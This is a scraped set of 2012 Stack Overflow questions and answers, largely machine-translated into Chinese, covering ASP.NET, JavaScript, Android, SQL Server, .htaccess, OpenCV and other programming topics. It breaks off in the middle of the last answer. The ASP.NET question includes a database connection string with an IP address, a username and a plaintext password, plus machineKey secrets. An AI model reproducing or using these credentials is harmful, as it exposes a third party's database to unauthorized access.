> ID：11935945
> 
> 赞同：-1
> 
> 时间：2012-08-13T14:05:11.317
> 
> 标签：macos, cocoa

您好想创建一个像 xscope 或 pixelruler 这样的应用程序，但是我创建的所有应用程序都有一个标准的窗口。我怎样才能在没有窗口的屏幕上直接绘图？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:37:18.257

没有窗口你不能画画，但你可以有一个透明背景的窗口。

[本教程](http://cocoawithlove.com/2008/12/drawing-custom-window-on-mac-os-x.html)应该可以帮助您。您将需要一个自定义`NSWindow`子类，并使其透明，您传入`NSBorderlessWindowMask`. `styleMask`然后您可以在窗口的内容视图中进行绘图。

# asp.net - 有没有人遇到“视图状态 MAC 验证失败。如果此应用程序由 Web Farm 或集群托管..'错误

> ID：11935946
> 
> 赞同：0
> 
> 时间：2012-08-13T14:05:12.510
> 
> 标签：asp.net, viewstate

我对此做了一些研究并尝试插入：

```
<machineKey decryptionKey="A4B12CCDD50E95F8GB9GFH6JKAT4Y0U0I2OF2DF2AAFE5AB46189C,IsolateApps" validation="AES" validationKey="480CDF2AS9S9AS5CFDGF0GHFH9JJH4KHKAKLJ2L9F3SAS82A6C16911A29EF48903783F94529C21570AACB72766FB38CD4CE7B85B0ACE3149DC5FC1CCF1AA1CECE3579659996593B06,IsolateApps"/> 
```

作为此错误的解决方案：

```
Validation of viewstate MAC failed. If this application is hosted by a Web Farm or cluster, ensure that <machineKey> configuration specifies the same validationKey and validation algorithm. AutoGenerate cannot be used in a cluster. 
```

这次我得到一个错误。

```
HTTP Error 500.19 - Internal Server Error
The requested page cannot be accessed because the related configuration data for the page is invalid. 
```

然后它在 Config 源代码中标记出这一行：

```
<add name="DemographicDBEntities" connectionString="metadata=res://*/DemoGraph.csdl|res://*/DemoGraph.ssdl|res://*/DemoGraph.msl;provider=System.Data.SqlClient;provider connection string=&quot;data source=207.27.57.76,1433;initial catalog=DemographicDB;persist security info=False;user  id=west;pwd=westhouseit;multipleactiveresultsets=True;App=EntityFramework&quot;" providerName="System.Data.EntityClient" />
</connectionStrings>
<machineKey decryptionKey="A4B12CCDD50E95F8GB9GFH6JKAT4Y0U0I2OF2DF2AAFE5AB46189C,IsolateApps" validation="AES" validationKey="480CDF2AS9S9AS5CFDGF0GHFH9JJH4KHKAKLJ2L9F3SAS82A6C16911A29EF48903783F94529C21570AACB72766FB38CD4CE7B85B0ACE3149DC5FC1CCF1AA1CECE3579659996593B06,IsolateApps"/>
<system.web>
<compilation debug="true" targetFramework="4.0" />
<customErrors mode="Off"/> 
```

机器钥匙标签的结构是否良好？我把它单独放在一个标签里。我将应用程序托管在在线主机上，因此无法使用 IIS 7.0 生成任何机器代码。我提出了几张票，但无济于事。感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:49:05.230

我相信问题在于 IIS 无权访问您的 webconfig 文件。

试试这个，如果它不起作用，请查看下面的链接，看看您是否可以尝试解决您的问题。

```
1.Open control panel
2.Click on” program” link (not uninstall programs)
3.Click” turn windows features on/off” link
4.locate” Internet Information services IIS” in the pop up window and expand its node
5.Expand the” World Wide Web Service” node
6.Expand “Application Development Features” node
7.check the check box of”ASP.NET”
8.Then click ok button 
```

下面是一个非常有趣的链接，可以帮助您：

[http://support.microsoft.com/kb/942055](http://support.microsoft.com/kb/942055)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T14:49:40.507

I don't think you can manually specify the key and include the `IsolateApps` option. It must be `Autogenerate,IsolateApps` or a specific value without the `IsolateApps` option.

See the [MSDN documentation](http://msdn.microsoft.com/en-us/library/w8h3skw9.aspx) for details.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T15:06:43.213

Below is a link to a bug report that references Windows 2003 and .Net framework 3.5 and a web garden setup.

Nothing says that the problem is restricted to Win 2003 or even framework 3.5\. In a web garden situation, one can imagine that the viewstate errors would happen VERY frequently, not just when the pool recycles (as we experienced).

[http://connect.microsoft.com/VisualStudio/feedback/details/412881/net-3-5-installer-breaks-web-gardens-when-used-with-custom-application-pool-identity](http://connect.microsoft.com/VisualStudio/feedback/details/412881/net-3-5-installer-breaks-web-gardens-when-used-with-custom-application-pool-identity)

To fix the metabase and registry permissions issues, we simply executed the following on our web server:

\Windows\Microsoft.NET\Framework\v2.0.50727\aspnet_regiis.exe -ga domain\useraccount

We then recycled the app pool one more time to regenerate the viewstate validation key.

Whether or not this works in your situation will depend on specific details of your situation.

# unix - 如何自动化电子邮件我

> ID：11935947
> 
> 赞同：-3
> 
> 时间：2012-08-13T14:05:13.923
> 
> 标签：unix

我在周一至周五收到了一封来自用户的电子邮件，其中包含 Excel 文件。我通常下载文件并更改名称并将其保存为 CSV 文件并将其加载到服务器中。

我可以使用 Unix 自动执行此过程吗？

谢谢你。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T15:23:01.467

简短的回答：是的，这是*可能*的。

更长的答案：这取决于。方法和可行性将取决于各种因素：

*   你是如何收到你的电子邮件的？您是否能够在电子邮件服务器本身上运行您的脚本，或者您是否需要将电子邮件检索到您的本地计算机？
*   目标电子邮件是否易于识别（特定发件人/标题/内容）？它是否包含指向 Excel 文件的链接，还是作为附件包含在内？
*   您可以假设特定的 Excel 格式还是需要考虑任意 Excel 版本？
*   *“将其加载到服务器中”*是什么意思？您需要将其复制到特定目录吗？通过 FTP/SCP 将其移动到远程计算机？
*   您是否需要在收到电子邮件时对其进行处理，或者您可以定期分批处理它们吗？

也就是说，不幸的是，您的问题对于 StackOverflow 来说太开放了（请参阅[常见问题解答](https://stackoverflow.com/faq#questions)）。您应该先尝试实施您的解决方案，然后在遇到*特定*困难或问题时发布问题。如果您包含问题的详细信息以及到目前为止您已尝试过的内容，这会有所帮助。

为了帮助您前进，这里有一些提示：

*   [如果您的电子邮件是远程存储的，请使用fetchmail 之](http://www.freebsd.org/doc/handbook/mail-fetchmail.html)类的东西通过 POP/IMAP 将电子邮件提取到您的本地邮箱
*   要自动调用 fetchmail，您可以[使用 cron 来安排它](http://www.scalix.com/wiki/index.php?title=HowTos/Fetchmail#Automating_Fetchmail)。
*   一旦电子邮件到达您的本地邮箱，您可以使用[procmail](http://www.procmail.org/)过滤掉特定的电子邮件并将其内容传递给任意命令/脚本进行处理
*   您可以使用[munpack](http://linux.die.net/man/1/munpack)从电子邮件中提取附件
*   如果您需要上述任何工具的帮助，谷歌索引了很多相关资源。您也可以询问[unix.SE](https://unix.stackexchange.com/questions/tagged/munpack+or+fetchmail+or+procmail)或[SuperUser](https://superuser.com/questions/tagged/munpack+or+fetchmail+or+procmail)。
*   要将 Excel 文件转换为 CSV，您可以查看[xls2csv](http://linux.die.net/man/1/xls2csv)。如果您无法使用发行版的包管理器安装命令，则源代码与[catdoc一起分发](http://www.wagner.pp.ru/~vitus/software/catdoc/)

恐怕我无法为您设计一个完整的解决方案，但我希望这至少能给您一个起点。祝你好运。

# android - 如何跨平台访问sqlite数据库

> ID：11935948
> 
> 赞同：1
> 
> 时间：2012-08-13T14:05:15.293
> 
> 标签：android, sqlite, android-sqlite

我正在自定义位置的我的 android 手机的 sd 卡上创建一个数据库，我正在逐字节读取这个 db 文件并通过制作套接字将其发送到 PC。在 PC 端，我收到并将其成功写入磁盘，但是当我在 SQLite 数据库浏览器中打开此文件时，它会给出错误文件已加密或损坏。

# .htaccess - 404，网址中有空格

> ID：11935952
> 
> 赞同：2
> 
> 时间：2012-08-13T14:05:19.560
> 
> 标签：.htaccess, apache2, http-status-code-404

我意识到雅虎搜索不能正确处理 URL 中的空格。

当用户单击以转到包含空格的我的网站页面时，雅虎将它们替换为“+”符号。

我的服务器没有正确处理 '+' 而不是 ' '，并产生 404 错误。

那么如何使用 .htaccess 将 '+' 替换为 ' '？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T17:37:42.507

该`+`符号可用于对空格进行 URL 编码。它一直是标准的一部分，Apache 2 绝对知道如何将 a 解码`+`为空间。可能发生的事情是将`+`自身编码为`%2B`，您可以使用以下方法将它们更改为空格：

```
RewriteEngine On
RewriteRule ^(.*)\+(.*)$ /$1\ $2 [L] 
```

# loops - 矩阵全为零，比循环大

> ID：11935956
> 
> 赞同：0
> 
> 时间：2012-08-13T14:05:28.663
> 
> 标签：loops, opencv, for-loop, matrix, reset

我有一个 700x1 大小的矩阵作为“srcMat”。我使用以下命令为空矩阵“dstMat”赋值：

```
cv::Mat dstMat ( srcMat.rows, srcMat.cols, srcMat.type() ); 

for ( int i = 0; i <  medianMat.cols ; i ++ )
{
   dstMat( cv::Range::all(), cv::Range( i*5+1, i*5+4 )).setTo(srcMat.at<int>(i));
} 
```

但这里的问题是：dstMat 在“for”循环之外（之后）全为零，但在循环内部，它正是我想要的值。这里有什么问题？提前谢谢了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T21:15:43.190

我认为问题在于每次您尝试选择一个范围时，您都在处理只读值。所以你失去了所有的价值，他们都没有得到真正的矩阵。

正如在 opencv 文档中所写，从返回的值`operator()`是`const`，因此您无法使用返回的值编辑矩阵：

> Mat Mat::operator()( Range rowRange, Range colRange)**常量**

但是，如果您使用 setTo 的第二个掩码参数，您应该没有问题：

> Mat& Mat::setTo(const Scalar& s, **const Mat& mask=Mat()** )

**编辑**

我会使用 colRange 复制和选择列，以下代码适用于我：

```
#include <opencv2/core/core.hpp>
#include <iostream>

int main( int argc, char** argv )
{
  cv::Mat dstMat ( 3, 12, CV_32S );

  for(int i = 0; i < 6; i++)
    dstMat.colRange(2*i,2*i+2).setTo(i);

  std::cout<< "Destination\n" << dstMat << std::endl;
  return 0;
} 
```

检查它是否也为你改变了矩阵

# sql-server - XML PATH 连接语法

> ID：11935957
> 
> 赞同：0
> 
> 时间：2012-08-13T14:05:30.507
> 
> 标签：sql-server, sql-server-2008, tsql

我使用嵌套查询来连接聚合的行数据。我在嵌套查询中使用的语法是

```
for XML PATH ('') 
```

有人可以解释上面的引号之间应该做什么吗？我做了一些测试，看起来它只是将我的行数据包含在开始和结束 HTML 之类的标签中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:18:23.677

我不是 100% 确定您的意思，但如果您的查询类似于以下内容，那么这可能会对您有所帮助：

```
SELECT    R.RegionID  AS [@RID],
          R.Enabled   AS [@Enabled],
          (
          SELECT      ST.TypeID  AS [@TID], 
                      QT.[Name] AS [@QTName],   
          FROM        Type ST
          INNER JOIN  QuarryType QT ON ST.QuarryTypeID = QT.QuarryTypeID
          WHERE       R.RegionID = ST.RegionID  
          FOR XML PATH ('QuarryType'), TYPE
          )
FROM      Region R          
FOR XML PATH ('Region'), ELEMENTS, ROOT('root') 
```

如您所见，每个`FOR XML PATH ('')`块中的文本没有什么特别之处，无论如何都与数据无关。它用于 XML 输出中的元素名称，如下所示：

```
<root>
    <Region RID="123" Enabled="true">
        <QuarryType TID="4" QTName="Quarry 1"/>
        <QuarryType TID="7" QTName="Quarry 2"/>
        <QuarryType TID="9" QTName="Quarry 5"/>
    </Region>
</root> 
```

如果您需要更多帮助，尽管问！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T18:13:21.257

空字符串 ('') 是一种特殊情况。你的观察是正确的，因为你放在那里的任何东西都会用你放在那里的任何东西的打开和关闭 XML 标记围绕你的行。例如，如果您说“for xml path ('a')”，它将用`<a> </a>`.

# android - 用android检测我周围的wifi设备

> ID：11935958
> 
> 赞同：3
> 
> 时间：2012-08-13T14:05:32.190
> 
> 标签：android, wifi, android-wifi

有没有办法可以检测到我周围的所有 Wifi 设备并从 android 设备获取信号强度。

对于实验用途，我想在一些 android 设备上运行一个应用程序。该应用程序应记录每部手机与其他手机之间的信号强度。我希望“连接”直接在手机之间，而不使用外部路由器。我相信这是可能的，因为 android 手机具有充当 Wifi 路由器的功能，因此它可能会被其他设备检测到。但我不知道如何以编程方式解决这个问题。

任何人都可以帮忙吗？你认为这可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-26T06:06:27.090

如果你想扫描附近的所有wifi，试试这个

创建一个wifiManager，BroadcastReceiver，使用任意异步任务扫描所有wifi，扫描结果会在广播接收器上

```
WifiManager wManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
// wifi Scan
    new wifiScan().execute(); // call to async task

    BroadcastReceiver br = new BroadcastReceiver() {
    @Override
    public void onReceive(Context c, Intent intent) {
    wifiList = wManager.getScanResults();

    for (int i = 0; i < wifiList.size(); i++) {
    ScanResult scanresult = wManager.getScanResults().get(i);
    ssid = scanresult.SSID;//ssid is Name of wifi (String)
    bid = scanresult.BSSID;// bssid: MAC of wifi (String)
    level = scanresult.level;//level: strength of wifi(int)
        }

        };

// Async task

public class wifiScan extends AsyncTask<Void, String, Void> {
        int i = 0;

    protected void onPreExecute() {

    }

    protected void onPostExecute(Void results) {
         if (results != null) { if (i < 6) { new wifiScan().execute(); 
                     }
                  }

    }

    @Override
    protected Void doInBackground(Void... params) {
        registerReceiver(br, new IntentFilter(
                WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));
        wManager.startScan();
        return null;
    }
} 
```

您将能够通过 wifi 在两个设备之间进行通信，而无需使用[Wifi Direct (P2P)](http://developer.android.com/reference/android/net/wifi/p2p/package-summary.html)的路由器/接入点。我认为此功能可以从 Android 4.0 访问。否则，我不确定。

# javascript - 如何使用 Javascript 对 API 进行 HTTP 调用？

> ID：11935963
> 
> 赞同：0
> 
> 时间：2012-08-13T14:05:46.923
> 
> 标签：javascript, jquery, api, http, request

如何在 Javascript 应用程序中使用公共 API？例如，我想使用 JQuery AJAX 调用 Zillow API。在 JQuery AJAX 中发出请求时（如下所示），我收到以下错误：XMLHttpRequest cannot load "MY HTTP REQUEST URL"。Access-Control-Allow-Origin 不允许来源“MY WEB DOMAIN”。

```
var requesturl = "http://www.zillow.com/webservice/GetRegionChildren.htm?zws-id="+zwsid+"&state="+state+"&city="+city+"&childtype=neighborhood"; 
```

代码：

```
var jqxhr = $.ajax({  
url: requesturl
})
.done(function(data) { 
    console.log(data);
}); 
```

我也尝试添加 crossDomain、dataType 和 headers 参数（如下所示），但它们没有帮助。

```
var jqxhr = $.ajax({  
url: requesturl,
crossDomain: true,
dataType: 'xml',
headers: { 'Access-Control-Allow-Origin': '*' },
beforeSend: setHeader
})
.done(function(data) { 
    console.log(data);
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:18:23.073

听起来您需要在 Zillow 注册您的网址，也许可以联系他们/在他们的文档页面上四处寻找。jquery 也有一个[get](http://api.jquery.com/jQuery.get/)方法，它使 ajax 请求更加简单。如果那是返回格式，还有[getJSON 。](http://api.jquery.com/jQuery.getJSON/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T14:12:20.943

最流行的公共 API 支持 JSONP 请求。有关详细信息，请参阅 API 文档。

跨 ajax 域请求受到限制。因此，您将需要发出 JSONP 请求。不用担心 JQuery 会处理其中的大部分。

# algorithm - 使用上下文无关语言测试成员资格

> ID：11935972
> 
> 赞同：0
> 
> 时间：2012-08-13T14:06:08.887
> 
> 标签：algorithm, context-free-grammar

我正在开发一个老虎机迷你游戏应用程序。构成中奖的规则相当复杂（n of a kind，n of any kind，特定顺序），更复杂的是，此代码应该适用于 (n >= 3) 的老虎机卷轴。

所以，经过一番思考，我相信定义上下文无关语言是最有效和可扩展的方式。这样我就可以在 XML 文件中定义语法。

所以我的问题是，给定一串符号 S，我该如何测试 S 是否使用给定的上下文无关语言？我是否会简单地用尽规则，直到我没有有效的规则/符号，或者是否有已知的算法可以提供帮助。谢谢。

另外，像这样的语言似乎很不规则，对吗？我从来不擅长证明，所以我避免尝试。

对我的方法的任何评论也将不胜感激。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:28:40.517

上下文无关语法的一般情况很难评估。

但是，有一些方法可以在上下文无关语法的子集中解析语法。

例如：编译器经常使用[SLR](http://en.wikipedia.org/wiki/Simple_LR_parser)和[LL](http://en.wikipedia.org/wiki/LL_parser)语法来解析编程语言，它们也是上下文无关的语言。要使用这些，您的语法必须属于这些“家族”之一（请记住 - 每种上下文无关语言都有无限数量的语法）。

您可能想要使用的一些通常用于编译器的实用工具是java中的[JavaCC和 C++ 中的](http://javacc.java.net/)[bison](http://www.gnu.org/software/bison/)。
（如果我没记错的话，Bison 是 SLR 解析器，JavaCC 是 LL Parser，但我可能是错的）

**PS**
对于具有插槽和符号的*特定*老虎机- 该语言绝对是规则的，因为其中最多有 k ^(n 个)“单词”，并且每种有限语言都是规则的。如果您正在为所有老虎机寻找语法，事情显然会变得复杂。`n``k`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T14:29:59.330

> “...给定一串符号 S，我如何测试 S 是否使用给定的上下文无关语言？”

如果字符串*w*在 L(G) 中；寻找 G 的一系列产生式规则并由此推导出*w的过程称为调用解析。*所以，你必须创建一个解析树来搜索一些推导。为此，您需要执行详尽的广度优先搜索。出现了一个严重的问题：搜索过程可能永远不会终止。为了防止无休止的搜索，您必须将语法转换为所谓的*范式*。

> “而且，这样的语言似乎很不规则，我说的对吗？”

不必要。每种常规语言都是无上下文的（因为它可以由 CTG 描述），但并非所有无上下文的语言都是常规的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T15:22:10.443

您最好的选择是使用适当的编程语言对其进行实际编码。CFG 是矫枉过正的，因为编写一些（如您所说）“相当复杂”的规则可能非常困难。例如，语法不适合谈论事物的数量。

例如，您将如何用这种语言编写“樱桃的数量大于任何其他物体的数量”？你给程序的人会怎么做？CFG 不能轻易地表达这些概念，而正则表达式无论如何也不能理智地做到这一点。

答案是语法不适合这项任务，除非老虎机试图造英语句子。

您还必须考虑当两个或更多“奖品序列”匹配时会发生什么！假设您想颁发最高奖，您需要一个有序的识别器列表。这并不是说除了任意函数​​之外，您不能使用（例如）正则表达式对识别器进行编码。我只是说一般的 CFG 解析是多余的，因为 CFG 让你超越常规语言（即正则表达式）的是能够考虑任意深度的解析树（如 N 级或更高级别的嵌套括号），这可能不是你关心什么。

例如，这并不是说您不想允许正则表达式。您可以通过使用解析器生成器来识别涉及樱桃香蕉和梨的正则表达式来简化这项工作，请参阅[http://en.wikipedia.org/wiki/Comparison_of_parser_generators](http://en.wikipedia.org/wiki/Comparison_of_parser_generators)，然后您可以将其*嵌入*，尽管您可能想简单地滚动自己的递归下降解析器（再次假设您不关心 CFG，特别是如果您的令牌是有界长度的）。

例如，下面是我可以用伪代码实现它的方式（理想情况下，您会使用具有良好列表操作的静态类型检查语言，我无法想到）：

```
rules = []
function Rule(name, code) {
    this.name = name
    this.code = code

    rules.push(this)  # adds them in order
}

##########################

Rule("All the same", regex(.*))

Rule("No two-in-a-row", function(list, counts) {
    not regex(.{2}).match(list)
})

Rule("More cherries than anything else", function(list, counts) {
    counts[cherries]>counts[x] for all x in counts
      or
    sorted(counts.items())[0]==cherries
      or
    counts.greatest()==cherries
})

for token in [cherry, banana, ...]:
    Rule("At least 50% "+token, function(list, counts){
        counts[token] >= list.length/2
    }) 
```

# c# - 将动态数据发送到服务器的 Kendo DataSource

> ID：11935974
> 
> 赞同：0
> 
> 时间：2012-08-13T14:06:15.210
> 
> 标签：c#, javascript, ajax, asp.net-mvc, kendo-ui

我是剑道新手，几天后我试图弄清楚如何用搜索数据填充剑道网格。我的情况如下：

我有 javascript 视图模型：

```
sl.kendo = function () {
    var billingReportViewModel = kendo.observable({
        billingReportCriteria: [],
        executeSearch: function (e) {
            var $grid = $("#gridResults").data("kendoGrid");
            $grid.dataSource.read();
            $grid.refresh();
        }
    });
    return {
        billingReportViewModel: billingReportViewModel
    }
} (); 
```

我用这个函数从服务器初始化 billingReportCriteria：

```
var initCriteriaViewModel = function () {
    $.ajax({
        url: 'GetBillingReportCriteria',
        type: "GET",
        dataType: "json",
        success: function (model) {                
            **$.extend(sl.kendo.billingReportViewModel.get("billingReportCriteria"), kendo.observable(model));**
            // bind to the viewModel
            kendo.bind($("#searchTable"), sl.kendo.billingReportViewModel);
        }
    });
}() 
```

比我声明将这个 billingReportCriteria 作为参数发送到服务器的网格数据源：

```
var gridDataSource = new kendo.data.DataSource({
    transport: {
        read: {
            url: "GetBillingReportResults",
            data: JSON.stringify(sl.kendo.billingReportViewModel.get("billingReportCriteria")),               
            cache: false,
            type: "POST"
        }
    },       
    schema: {
        data: "Items",
        total: 10 // total number of data items is returned in the "count" field of the response
    }
}); 
```

我初始化我的剑道网格：

```
$("#gridResults").kendoGrid({
    columns: [
          {
              field: "Name"
          },
          {
              field: "Title"
          }],
    dataSource: gridDataSource,
    autoBind: false
}); 
```

当我从视图模型“executeSearch”执行搜索时，我转到服务器，但 billingReportCriteria 为空！当我从 F12 Chrome 工具中检查 'billingReportViewModel' 值时，一切似乎都正常，但是当我检查 'sl.kendo.billingReportViewModel.billingReportCriteria' 或 'sl.kendo.billingReportViewModel.get("billingReportCriteria")' 的值时 -它是空的，尽管 'sl.kendo.billingReportViewModel.get("billingReportCriteria.Name")' 例如具有正确的值！你能建议问题是什么吗？不知何故，我无法将正确的“billingReportCriteria”发送到服务器！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T13:12:33.413

我弄清楚以下事情。当我在服务器上获取负责返回结果的方法时，我可以获得传递参数的唯一方法是在方法主体中使用 Response.Form 或 Response.QueryString。如何将参数传递给该方法，以便可以像这样获取它们：

```
public JsonResult GetBillingReportResults(string billingCriteria)
{
    string criteria = Request.Form["billingCriteria"]; //I can do it like this, but I want to pass the arguments as method parameters
} 
```

# javascript - 如何检查函数是否从外部js文件中调用

> ID：11935977
> 
> 赞同：1
> 
> 时间：2012-08-13T14:06:18.107
> 
> 标签：javascript, function

我的页面上有一个没有从我们的服务器加载的外部 JS 文件。简而言之，我对该文件没有任何控制权，也无法编辑该文件。我创建了 1 个函数，我希望在调用该外部文件中的函数之后调用它。

我知道外部文件的功能名称。一旦执行来自外部文件的函数，我希望调用我的函数。我该怎么做？

如果您不明白我的问题，请告诉我。我会尝试再次解释它。

提前致谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T14:13:27.690

如果外部函数在全局范围内，您可以用自己的包装器替换它：

```
var _old = foreignFunction;
foreignFunction = function() {

    // put pre-call stuff here
    ...

    // call with the original context and args
    _old.apply(this, arguments);  

    // and post-call stuff here
    ...
} 
```

请注意使用`.apply`确保提供给原始函数的任何上下文和参数仍然提供给它。没有它，该`this`函数内的变量可能不是它应该是的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T14:10:41.820

你必须用你自己的替换外部函数。这可能会也可能不会，取决于执行的顺序。

函数 (ForeignFunc()) 加载到页面后

```
var _originalForeignFunc = ForeignFunc;
ForeignFunc = function() {
    _originalForeignFunc();
    //now do whatever you want to do here
    alert("After Foreign Func Execution");
} 
```

`ForeignFunc()`请记住，只有在实际调用之前您可以用自己的定义替换它才会起作用。

# ajax - IE8：浏览器缓存和 ajax

> ID：11935979
> 
> 赞同：0
> 
> 时间：2012-08-13T14:06:22.897
> 
> 标签：ajax, internet-explorer, web-applications

我用 ajax 开发了一个 web 应用程序。

Firefox 很好，但在 IE8 下我的一些 ajax 动态（例如在按钮后更改 div 等）不起作用。只有当我禁用浏览器缓存（F12 - 缓存 - 总是从服务器重新加载）。

认为 IE 不会检查 ajax 响应是否更改了网站的一部分或其他内容。有什么想法我可以用这个选项来处理这个吗？

我尝试了请求中的随机数或响应中的时间戳，但没有奏效。

谢谢！ch

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T04:46:33.183

尝试。$.ajaxSetup({ 缓存: false });

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:05:33.703

不确定您使用哪种服务器端语言...我在服务器端使用了以下代码（在 ...aspx.cs 文件中）：

```
 Response.AddHeader("Cache-Control", "No-Cache");
        Response.Write... 
```

# .htaccess - 刚刚创建了一个新的子域，主 .htaccess 文件导致 404。怎么办？

> ID：11935981
> 
> 赞同：0
> 
> 时间：2012-08-13T14:06:25.437
> 
> 标签：.htaccess, subdomain

我刚刚创建了一个新的子域（subdomain.example.com），而主站点 htaccess 文件（例如.com）通过尝试将子域定向到与主站点相同的规则而导致问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:06:25.437

我真的不认为我需要提供代码。一时兴起，在我发布这个问题之前，我在子域目录中创建了一个新的 .htaccess 文件，它解决了问题。现在对于我添加的每个子域，我只需要记住这是我必须做的事情！

希望这对其他人有帮助！

# c# - 日历控件中的时区

> ID：11935985
> 
> 赞同：1
> 
> 时间：2012-08-13T14:06:39.023
> 
> 标签：c#, datetime, calendar, timezone

我们有一个安排约会的系统，总部设在英国。项目经理使用它来安排英国员工和澳大利亚员工的约会。

PM 将在周一上午 9 点的日程表中进行预约，但这与地点无关；即，当英国工作人员看到它时，他/她将其阅读为英国时间上午 9 点，而当澳大利亚工作人员阅读它时，他们将其阅读为澳大利亚时间上午 9 点。

我编写了一个 Outlook 插件来显示这些预订并允许选择它们。问题是当插件在澳大利亚运行时，它会看到日期时间来自英国并添加了时差。因此，澳大利亚员工的任命在不应该的时候被抵消了。

我正在使用 Infragistics Schedule 控件，想知道最好的方法是确保上午 9 点的约会在所有地点都显示为上午 9 点并且不应用偏移量？

谢谢， 德拉米

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:08:04.103

对我来说，最好的方法是始终在代码中的任何地方使用 UTC 日期时间。只有在显示时，您才能切换（或不切换）到合适的时区。

[http://msdn.microsoft.com/en-us/library/system.datetime.aspx](http://msdn.microsoft.com/en-us/library/system.datetime.aspx)

使用 DateTimeKind 枚举 ( [http://msdn.microsoft.com/en-us/library/shx7s921.aspx](http://msdn.microsoft.com/en-us/library/shx7s921.aspx) )定义区域设置/UTC

始终使用 DateTime.ToUniversalTime() 以获取 UTC 中的 DateTime ( [http://msdn.microsoft.com/en-us/library/system.datetime.touniversaltime.aspx](http://msdn.microsoft.com/en-us/library/system.datetime.touniversaltime.aspx) )

（当然 ToLocalTime() 也存在）。

您应该进行一些测试以检查一切是否符合预期。

# css - 背景图像被切断

> ID：11935986
> 
> 赞同：0
> 
> 时间：2012-08-13T14:06:39.423
> 
> 标签：css, background-image

有谁知道由于窗口尺寸较小而如何切断背景图像。请看一下这个网站。[http://nfldata.com](http://nfldata.com)。尝试使窗口宽度小于 900 像素。然后滚动到右侧。您会发现背景图像不存在。但是对于页脚，它出现了。导致此问题的 CSS 代码是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:17:19.063

我认为您正在查看 content-wrapper div 的背景，如下所示。由于该元素的宽度设置为 100%，并且中心块 div 的固定宽度为 1000px，如果您将窗口折叠到小于 1000px 的宽度，则内容包装器将不会显示并且背景将有效消失。

HTML 元素...

```
<div id="content-wrapper">
   <div class="center-block">
     ....
   </div>
</div> 
```

相关CSS：

```
#content-wrapper {
  margin: 0 auto;
  width: 100%;
  background-image: url(/images/content-background.png);
  background-position: center top;
  background-repeat: repeat-y;
}

#content-wrapper .center-block {
  width: 1000px;
} 
```

关于标题，您会看到它有一个声明

```
#header {
  width : 100%
  ...
} 
```

这会将元素的宽度设置为父容器的宽度 - 在这种情况下，它是活动窗口（在您的情况下为 900px 或更小）。但是，由于页面上还有其他元素指定了 1000 像素或更大的宽度，因此这些 div 内的内容会超出此范围。

您可以通过将正文的宽度设置为 1000 像素（或任何页面的最大宽度）来扩展页面，在这种情况下，标题将扩展为该大小的 100%。或者，您可以用相对定位的 包围整个内容，然后 100% 指令将指示周围 div 的 100% 宽度，而不仅仅是窗口。

# javascript - 如果有 2 个字符，Javascript 会切掉最后一个字符

> ID：11935987
> 
> 赞同：-1
> 
> 时间：2012-08-13T14:06:44.240
> 
> 标签：javascript

如果有第二个标志如何切断第二个标志？有时 id 是 ....5a 和 5b，我需要删除 'a' 和 'b'

JS

```
$(".mieszkanie").click(function() {
        var num = this.id.replace(/c_10_0/, "");
        var n = num.length;
        if (n = 2) { 
            [than cut second sign]
        }
        $('.pdf').attr({ 
            href: "img/rzuty/mieszkania/pietro10rzuty/00" + num + ".pdf"
        });
        $('.karta img').attr({ 
            src: "img/rzuty/mieszkania/pietro10rzuty/00" + num + ".png",
            alt: "mieszkanie 00" + num
        });
    }); 
```

HTML

```
<div id="rzuty10p" class="rzuty">
            <span id="c_10_01" class="mieszkanie" title=""></span>
            <span id="c_10_02" class="mieszkanie" title=""></span>
            <span id="c_10_03" class="mieszkanie" title=""></span>
            <span id="c_10_04" class="mieszkanie" title=""></span>
            <span id="c_10_06" class="mieszkanie" title=""></span>
            <span id="c_10_05a" class="mieszkanie" title=""></span>
            <span id="c_10_05b" class="mieszkanie" title=""></span>
        </div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T14:11:01.410

您可以使用该`substr`方法仅获取第一个字符：

```
var num = this.id.replace(/c_10_0/, "").substr(0, 1); 
```

# lua - 在另一个矩形中找到最大的 16:9 矩形

> ID：11935995
> 
> 赞同：0
> 
> 时间：2012-08-13T14:07:02.513
> 
> 标签：lua, rectangles

我正在处理这个 Lua 脚本，我需要能够在另一个没有特定纵横比的矩形中找到最大的 16:9 矩形。那么你能告诉我我该怎么做吗？您不必编写 Lua - 伪代码也可以。

谢谢！

我已经尝试过并且可以确认这不适用于较低比率的外部矩形。

```
if wOut > hOut then 
wIn = wOut
hIn = (wIn / 16) *9
else 
hIn = hOut
wIn = (hIn / 9) * 16 
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:22:54.790

```
heightCount = originalHeight / 9;
widthCount = originalWidth / 16;

if (heightCount == 0 || widthCount == 0)
